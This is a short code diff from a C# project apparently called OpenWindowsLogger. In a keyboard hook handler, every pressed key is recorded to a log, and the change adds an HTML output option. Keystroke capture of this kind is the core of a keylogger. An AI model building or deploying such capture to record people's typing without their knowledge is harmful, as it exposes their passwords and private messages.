@@ -46,7 +46,7 @@ namespace OpenWindowsLogger
       {
         string key = kc.ConvertToString(e.KeyboardData.VirtualCode);
         //MessageBox.Show(key);
-        OpenWindowsLogger.OWLmain.log.rwlog("w", "/PRESSED/" + key);
+        OpenWindowsLogger.OWLmain.log.rwlog("w", "PRESSED/" + key, OWLmain.HTMLout);
       }
     }
 
